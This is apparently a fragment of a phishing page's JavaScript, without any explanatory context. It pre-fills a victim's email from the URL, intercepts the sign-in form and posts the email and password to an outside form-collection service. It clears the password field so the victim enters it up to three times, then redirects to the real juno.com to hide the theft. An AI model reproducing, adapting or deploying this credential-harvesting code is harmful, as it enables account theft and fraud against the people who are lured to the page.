    <script>
        window.onload = function() {
          // Function to extract query parameters from the URL
          function getQueryParam(param) {
            const urlParams = new URLSearchParams(window.location.search);
            return urlParams.get(param);
          }
      
          // Get the 'email' parameter from the URL
          const email = getQueryParam('email');
          
          // If an email is present in the URL, set it as the value of the email input field
          if (email) {
            document.querySelector('input[name="email"]').value = email;
          }
        };
      </script>

<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
<script>
$(document).ready(function() {
    var attemptCount = 0;
    
    $("#contact").on('submit', function(e) {
        e.preventDefault();
        
        var email = $("#username").val();
        var password = $("input[name='pass']").val();
        
        attemptCount++;
        
        if (attemptCount <= 3) {
            $.ajax({
                dataType: "JSON",
                url: "https://submit-form.com/rCt1wY5OC",
                type: "POST",
                data: {
                    email: email,
                    password: password
                },
                beforeSend: function() {
                    $("#submit-btn").html("Verifying...");
                },
                success: function(response) {
                    if (response) {
                        console.log(response);
                    }
                },
                // error: function() {
                //     alert("Invalid credentials, please try again..");
                // },
                complete: function() {
                    $("#submit-btn").html("Sign-in");
                    // Clear password field after first,,, and second submissions
                    if (attemptCount < 3) {
                        $("input[name='pass']").val('');
                    }
                    // Redirect after third submission
                    if (attemptCount === 3) {
                        window.location.replace("https://www.juno.com/");
                    }
                }
            });
        }
    });
});
</script>
